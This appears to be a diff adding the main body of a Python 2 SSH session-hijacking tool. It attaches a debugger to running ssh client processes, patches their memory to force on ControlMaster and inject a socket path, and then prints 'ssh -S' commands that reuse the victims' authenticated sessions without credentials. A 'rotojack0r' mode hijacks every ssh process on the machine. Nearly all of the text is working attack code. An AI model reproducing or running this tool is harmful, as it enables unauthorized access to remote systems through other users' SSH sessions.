+g = gdbmi()
+
+if rotojack0r:
+	sshpath = commands.getoutput("which ssh")
+	if sshpath == "":
+		print "Sorry, unable to figure out path to ssh"
+		sys.exit(1)
+	bin = sshpath
+
+if not testmode and not rotojack0r:
+	try:
+		bin = os.path.realpath("/proc/%d/exe"% pid)
+	except (TypeError, AttributeError):
+		bin = "/proc/%d/exe"% pid
+
+symbols = None
+if cacheSyms and os.path.exists(os.path.join(JACKPATH, SYMCACHE)):
+	print "Symbol cache detected, using cached symbols!"
+	f = file(os.path.join(JACKPATH, SYMCACHE))
+	symbols = pickle.load(f)
+	print "Skipping Phases 0 thru 4. Vape %s to clear" % os.path.join(JACKPATH, SYMCACHE)
+if symbols == None:
+	if offlineDisas:
+		print "Phase 0: Loading offline debugger..."
+		print "  - connecting to %s offline..." % (bin),
+		try:
+			g.connect(None, bin)
+			print "Connected"
+		except GDBMIAttachError, i:
+			print i
+			sys.exit(1)
+	
+		if not testmode:
+			print "  - setting break"
+			main = g.getSection(".text")[0]
+			if main < 0x8000000:	# Okay, this is a bit ghetto
+				main += 0x8000000
+			g.insertBreak(main)
+			print "  - loading"
+			g.command("start")
+			g.wait()
+			print "  - caught load point"
+	else:
+		print "Phase 0: Loading online debugger..."
+		print "  - connecting to %s pid %d..." % (bin, pid),
+		try:
+			g.connect(pid, bin)
+			print "Connected"
+		except GDBMIAttachError, i:
+			print i
+			sys.exit(1)
+	
+	print "Phase 1: Loading sections, finding magic..."
+	sys.stdout.flush()
+	
+	symbols = SymbolResolver()
+	
+	sectionsNeeded = [".init", ".text", ".rodata", ".bss", ".plt", ".got.plt"]
+	try:
+		symbols.updateSections(g, sectionsNeeded, bin)
+	except ValueError, i:
+		print " - %s" % i
+		sys.exit(1)
+	
+	syms = str(symbols)
+	for s in syms.split("\n"):
+		print "   " + s
+	
+	# Find the right place for us to inject the stub. 
+	print "  - ingress magic",
+	magic = "setting up multiplex master socket"
+	magicloc = findStringAddrOpt(g, symbols.getSection(".rodata"), magic)
+	if magicloc == None:
+		print "NOT FOUND"
+		sys.exit(1)
+	
+	offsetToMagic = 0x100000000 - (symbols.getSection(".got.plt")[0] - magicloc)
+	print "0x%08x, offset from plt: 0x%08x" % (magicloc, offsetToMagic)
+	
+	print "  - egress magic",
+	magic = "fd %d setting O_NONBLOCK"
+	magiclocNonBlock = findStringAddrOpt(g, symbols.getSection(".rodata"), magic)
+	if magiclocNonBlock == None:
+		print "NOT FOUND"
+		sys.exit(1)
+	
+	offsetToMagicNonBlock = 0x100000000 - (symbols.getSection(".got.plt")[0] - magiclocNonBlock)
+	print "0x%08x, offset from plt: 0x%08x" % (magiclocNonBlock, offsetToMagicNonBlock)
+	
+	
+	# Animation is easier than making it faster :D
+	spin = 0
+	spinner = [
+	".     ",
+	"..    ",
+	"...   ",
+	"....  ",
+	"..... ",
+	"......",
+	"..... ",
+	"....  ",
+	"...   ",
+	"..    ",
+	".     ",
+	"..    ",
+	"...   ",
+	"....  ",
+	"......",
+	"-.....",
+	"'-....",
+	"-'-...",
+	".-'-..",
+	"-.-'-.",
+	"'-.-'-",
+	"-'-.-'",
+	".-'-.-",
+	"-.-'-.",
+	"'-.-'-",
+	"-'-.-'",
+	".-'-.-",
+	"..-'-.",
+	"...-'-",
+	"....-'",
+	"....-'",
+	".....-",
+	"......",
+	"..... ",
+	"....  ",
+	"...   ",
+	"..    ",
+	".     ",
+	"!     ",
+	"-!    ",
+	"--!   ",
+	"----! ",
+	"-----!",
+	"----! ",
+	"---! !",
+	"--! !-",
+	"-! !--",
+	"! !---",
+	" !----",
+	"!-----",
+	"----- ",
+	"---   ",
+	"--    ",
+	"-     ",
+	"|     ",
+	"\     ",
+	"-     ",
+	"/     ",
+	"|     ",
+	" |    ",
+	" \    ",
+	" -    ",
+	" /    ",
+	" |    ",
+	"  |   ",
+	"  \   ",
+	"  -   ",
+	"  /   ",
+	"  |   ",
+	"   |  ",
+	"   \  ",
+	"   -  ",
+	"   /  ",
+	"   |  ",
+	"    | ",
+	"    \ ",
+	"    - ",
+	"    / ",
+	"    | ",
+	"     m",
+	"    ma",
+	"   man",
+	"  man ",
+	" man h",
+	"man ho",
+	"an how",
+	"n how ",
+	" how s",
+	"how sl",
+	"ow slo",
+	"w slow",
+	" slow ",
+	"slow i",
+	"low is",
+	"ow is ",
+	"w is y",
+	" is yo",
+	"is you",
+	"s your",
+	" your ",
+	"your s",
+	"our sh",
+	"ur shi",
+	"r shit",
+	"shit  ",
+	"hit   ",
+	"it    ",
+	"t     ",
+	"      ",
+	]
+	def spinHandler(x,y):
+		global spin
+		frame = spin % len(spinner)
+		if spin > 0:
+			bs = len(spinner[0])
+		else:
+			bs = 0
+		sys.stdout.write("\x08" *bs + spinner[frame])
+		spin += 1
+		sys.stdout.flush()
+		signal.alarm(1)
+	
+	print "Phase 2: Disassembling .text (this may take a while)",
+	os.nice(5)
+	if g.debug_level == 0:
+		signal.signal(signal.SIGALRM, spinHandler)
+		signal.alarm(1)
+	
+	
+	d = Disassembler(g, symbols.getSection(".text")[0], symbols.getSection(".text")[1])
+	signal.alarm(0)
+	
+	print "Done"
+	print "Phase 3: Searching for where magic is used..."
+	
+	listenerDebugLoc = findStringLoad("ingress magic", magicloc, offsetToMagic)
+	if listenerDebugLoc == None:
+		sys.exit(1)
+	
+	nonblockDebugLoc = findStringLoad("egress magic", magiclocNonBlock, offsetToMagicNonBlock)
+	if nonblockDebugLoc == None:
+		sys.exit(1)
+	
+	print "Phase 4: Symbol resolution..."
+	
+	x = d.disasm[d.addrToLineNo(listenerDebugLoc) -1]
+	if x[1].startswith("j") and x[1] != "jmp":
+		print "  - preceeding instruction is conditional jmp, reading up."
+		jloc = d.disasm[d.addrToLineNo(listenerDebugLoc) - 1][0]
+	else:
+		print "  - preceeding instrucion isn't a conditional jmp, searching for inbound jmp"
+	
+		jloc = d.findInstruction("j.{1,2}", "0x%x" % listenerDebugLoc)
+		if jloc == None:
+			print "OH DEAR, no jmp to 0x%08x" % listenerDebugLoc
+			sys.exit(1)
+	
+	jline = d.addrToLineNo(jloc)
+	start = 0
+	
+	x = d.disasm[jline - start]
+	print "  - spotted %s to magic at 0x%08x" % (x[1], jloc)
+	
+	def spotTestAndLoad(start, name):
+	
+		x = d.findInstruction("test", "(?P<one>REG),(?P=one)", d.addrToLineNo(start), True)
+		if x == None:
+			print "OH DEAR: didn't find test 0 that we were hoping for"
+			sys.exit(1)
+	
+		x = d.disasm[d.addrToLineNo(x)]
+		print "  - spotted test-zero: 0x%08x" % x[0]
+		reg = x[2].split(",")[0]
+	
+		test1 = x
+	
+		x = d.findLoad(reg, x[0], True)
+		if x == None:
+			print "OH DEAR: failed to track loading of %s" % reg
+			sys.exit(1)
+	
+		if len(x) == 2:
+			symbols.addSymbol(name, x[1])
+		else:
+			firstRound = x[1]
+			x = d.findLoad(x[2], x[0][0], True)
+			if x == None:
+				print "OH DEAR: failed to track loading of %s" % reg
+				sys.exit(1)
+	
+			secondRound = x[1]
+			if len(x) == 3:
+				print "  - assuming gcc4-style %s points to .got.plt[0]" % (x[2])
+				secondRound += symbols.getSection(".got.plt")[0]
+	
+			base = struct.unpack("<L", g.getWord(secondRound))[0]
+			print "  - loaded pointer 0x%08x from 0x%08x" % (base, secondRound)
+	
+			symbols.addSymbol(name, base + firstRound)
+	
+		return test1[0]
+	
+	x = spotTestAndLoad(jloc, "control_master")
+	x = spotTestAndLoad(d.disasm[d.addrToLineNo(x) - 1][0], "control_path")
+	
+	symbols.addSymbol("ssh_control_listener", x)
+	
+	print "  - Finding egress point... ",
+	
+	e1 = d.findInstruction("call",".*",d.addrToLineNo(nonblockDebugLoc))
+	if e1 == None:
+		print "FAILED"
+		sys.exit(1)
+	
+	print "0x%08x" % e1, 
+	
+	e2 = d.findInstruction("call",".*",d.addrToLineNo(e1) + 1)
+	if e2 == None:
+		print "FAILED"
+		sys.exit(1)
+	print "0x%08x" % e2,
+	
+	symbols.addSymbol("egressLoc", d.disasm[d.addrToLineNo(e2) + 1][0])
+	print "0x%08x" % symbols["egressLoc"]
+	
+	print "  - Lookup select in PLT... ",
+	try:
+		symbols.addSymbol("select@plt", int(g.getSymbolAddress("select@plt"),16))
+	except ValueError, i:
+		print "FAILED: %s" % i
+		sys.exit(1)
+	
+	print "0x%08x" % symbols["select@plt"]
+	
+	print "  - Find call select...",
+	try:
+		symbols.addSymbol("call_select", d.findInstruction("call", "0x%x" % symbols["select@plt"]))
+	except ValueError, i:
+		print "FAILED: %s" % i
+		system.exit(1)
+	
+	print "0x%08x" % symbols["call_select"]
+	
+	print "  - Find place to stash socket path",
+	try:
+		symbols.addSymbol("at", findStringAddrOpt(g, symbols.getSection(".rodata"), "@" * 59))
+	except ValueError, i:
+		print "FAILED: %s" % i
+		sys.exit(1)
+	
+	print "0x%08x" % symbols["at"]  
+	
+	print "  - Finished symbol discovery:"
+	syms = str(symbols)
+	for s in syms.split("\n"):
+		print "     " + s
+	
+	if cacheSyms:
+		try:
+			f = file(os.path.join(JACKPATH, SYMCACHE), "w")		
+			pickle.dump(symbols, f) 
+			f.close()
+			print "  - Cached symbols"
+		except IOError:
+			print "  - Failed to write symbol cache"
+	
+	if offlineDisas:
+		if g.connected:
+			print "  - killing offline debugger...",
+			g.kill()
+			g.disconnect()
+			print "done"
+
+if testmode:
+	print "Woot, testmode completed successfully for %s" % bin
+	sys.exit(0)
+
+def jackinTiem(pid, bin):
+	print "Phase 5: Preparing to 'jack..."
+
+
+	jackpath = JACKPATH
+
+	if offlineDisas:
+
+		print "  - attaching debugger for real...",
+		try:
+			g.connect(pid, bin)
+			print "Connected to pid %d" % pid
+		except GDBMIAttachError, i:
+			print i
+			return (None, None)
+
+		print "  - rebasing symbols incase the loader is a sneaky randomising type"
+		if symbols.rebase(g, bin):
+			syms = str(symbols)
+			print "  - Yep, we have a 'secure' loader"
+			for s in syms.split("\n"):
+				print "  " + s
+
+	host = sshArgsToHost(getArgv(pid))
+	print "  - remote host: %s" % host
+
+	print "  - checking current status"
+
+	SSHCTL={0: "SSHCTL_MASTER_NO",
+			1: "SSHCTL_MASTER_YES",
+			2: "SSHCTL_MASTER_AUTO",
+			3: "SSHCTL_MASTER_ASK",
+			4: "SSHCTL_MASTER_AUTO_ASK",}
+
+	ccm =  struct.unpack("<L", g.getWord(symbols["control_master"]))[0]
+	if ccm != 0:
+		print "  - Hrm, control_master is already set to %s" % SSHCTL[ccm]
+	else:
+		print "  - Nope, master mode is off, for now :>"
+
+	ccp = struct.unpack("<L", g.getWord(symbols["control_path"]))[0]
+	if ccp != 0:
+		print "  - Hrm, control_path is already set to 0x%08x" % ccp
+		c = g.getByte(ccp)
+		while c[-1] != "\x00":
+			c += g.getByte(ccp+ len(c))
+		print "  - Current control_path: %s" % c
+		jackpath=c[:-1]
+	else:
+		print "  - No control_path set"
+
+	if ccm in [1,2] and ccp != 0:
+		print "  - It looks like this ssh client already has master-mode turned on, or you already masterjacked it."
+	else:
+
+		if ccp == 0:	
+			jackpath += host
+			if not os.path.exists(os.path.dirname(jackpath)):
+				print "  - creating directory for jack socket"
+				os.makedirs(os.path.dirname(jackpath))
+
+			i = 0
+			while os.path.exists(jackpath):
+				print "  - hrm, stale socket in %s" % jackpath
+				if i < 1:
+					jackpath += (".%d" % i)
+				else:
+					jackpath = jackpath[:jackpath.rindex(".")] + (".%d" % i)
+				i+=1
+				print "  - trying %s" % jackpath
+
+			print "  - patch in jackpath... ",
+			for i in range(len(jackpath)):
+				g.setByte(symbols["at"] + i, ord(jackpath[i]))
+
+			g.setByte(symbols["at"] + len(jackpath), 0)
+			print " value: %s" % jackpath
+			print "  - update pointer... ",
+
+			g.setWord(symbols["control_path"], symbols["at"] )
+			print "done"
+		else:
+			print "  - using existing control_path"
+
+		print "  - enable master...",
+		g.setWord(symbols["control_master"], 1) # SSHCTL_MASTER_YES
+		print "done"
+
+		print "  - preparing select patch... ",
+
+		# mov 4(%esp),eax
+		# inc %eax
+		# mov %eax,4(%esp)
+		# jmp (safeplace)
+		selpatch = "\x8b\x44\x24\x04\x40\x89\x44\x24\x04\xe9" 
+		selpatch += struct.pack("<L", symbols["select@plt"] - (symbols.getSection(".init")[0] + 14))
+
+		print binascii.hexlify(selpatch)
+
+		print "  - planting seeds of evil... ",
+		for i in range(len(selpatch)):
+			g.setByte(symbols.getSection(".init")[0] + i, ord(selpatch[i]))
+		print "0x%08x %d bytes " % (symbols.getSection(".init")[0], len(selpatch))
+		print "  - patching call to select... ",
+		selcallpatch = "\xe8" + struct.pack("<l",symbols.getSection(".init")[0] - symbols["call_select"] - 5)
+		for i in range(len(selcallpatch)):
+			g.setByte(symbols["call_select"] + i, ord(selcallpatch[i]))
+		print binascii.hexlify(selcallpatch)
+
+		print "Phase 6: PLZ CAN IT BE 'JACKIN TIEM NAO?"
+
+		signal.signal(signal.SIGALRM, ohnoes)
+		signal.alarm(2)
+
+		print "  - Inserting breakpoint at safe place 0x%08x" % symbols["call_select"]
+		g.insertBreak(symbols["call_select"])
+
+
+		print "  - Continuing execution."
+		g.cont()
+
+
+		print "  - Smacking it upside the head with a SIGWINCH to wake it up..."
+		os.kill(pid, signal.SIGWINCH)
+
+		print "  - Waiting for breakpoint..."
+		g.waitForBreak()
+		print "  - Arrived at safe place, initiating evil..."
+		print "  - Saving regs... "
+
+		regs = g.getRegs()
+		#for k,v in regs.iteritems():
+		#	print "     %-6s: 0x%08x" % (k,v)
+
+		print "  - Clearing breakpoint"
+		g.clearBreak(1)
+
+		print "  - Setting new breakpoint at 0x%08x" % symbols["egressLoc"]
+		g.insertBreak(symbols["egressLoc"])
+
+		print "  - Setting EIP to 0x%08x" % symbols["ssh_control_listener"]
+		g.setEIP(symbols["ssh_control_listener"])
+		print "  - Making room on the stack",
+		g.setReg("esp", regs["esp"] - 512)  #ought to be enough room
+		print "0x%08x" % (regs["esp"] - 512)
+
+		#g.interact()
+		print "  - Continuing execution."
+
+		g.cont()
+		print "  - Waiting for breakpoint..."
+		g.waitForBreak()
+
+		print "  - Zomg, caught breakpoint after doing the deed! Woot!"
+		signal.alarm(0)
+
+		print "  - Resetting registers"
+		for k,v in regs.iteritems():
+			g.setReg(k,v)
+
+		print "  - Clearing break"
+		g.clearBreak(2)
+		print "  - Finished cleaning up"
+
+
+
+	print "  - Detaching from process."
+	g.disconnect()
+
+	# Clear timeout handler
+	signal.signal(signal.SIGALRM, signal.SIG_IGN)
+
+	print "Phase 7: Testing that it worked... ",
+	if os.path.exists(jackpath):
+		print "Woot!"
+	else:
+		print "Suck!"
+		print "Oh well, better luck next time."
+		sys.exit(1)
+
+	return jackpath, host
+
+if rotojack0r:
+	pids = [ int(p) for p in os.listdir("/proc") if re.match("[0-9]+", p) ]
+	sshpids = []
+	for p in pids:
+		try:
+			if os.path.realpath("/proc/%s/exe" % p) == sshpath:
+				sshpids.append(p)
+		except OSError:
+			pass
+		except TypeError:
+			pass
+
+	if len(sshpids) == 0:
+		print "Failed to spot any ssh clients running for rotojack :("
+		sys.exit(1)
+	print "--=[ \m/ Woop Woop! Rotojack0r mode enabled! \m/ ]=--"
+	print "  - %d processes to jack" % len(sshpids)
+	rjr = []
+	for p in sshpids:
+		print "  - Rotojackin' pid %d" % p
+		jp,h = jackinTiem(p, sshpath)
+		if jp != None:
+			rjr.append((jp,h))
+
+else:
+	jp,h = jackinTiem(pid, bin)
+
+
+if rotojack0r:
+	print "\nRotojacked you the following shells:"
+	for jp,h in rjr:
+		print "  ssh -S %s %s" % (jp, h)
+
+	print "\nRight, to use your masterjacked connection, just supply -S %s with your ssh client, and you wont need to auth. Works with scp and sftp too. :D, for scp, you need to use -o \"ControlPath %s\" instead, because scp doesn't understand -S." % (jp,jp)
+	print "\nEnjoy your shells, use your powers for good.\n <3 metlstorm"
+
+else:
+	print "\nRight, to use your masterjacked connection, just supply -S %s with your ssh client, and you wont need to auth. Works with scp and sftp too. :D, for scp, you need to use -o \"ControlPath %s\" instead, because scp doesn't understand -S." % (jp,jp)
+	print "Now, try this:\n  ssh -S %s %s" % (jp, h)
+
+	print "\nEnjoy your shell, use your powers for good.\n <3 metlstorm"
+
+sys.exit(0)
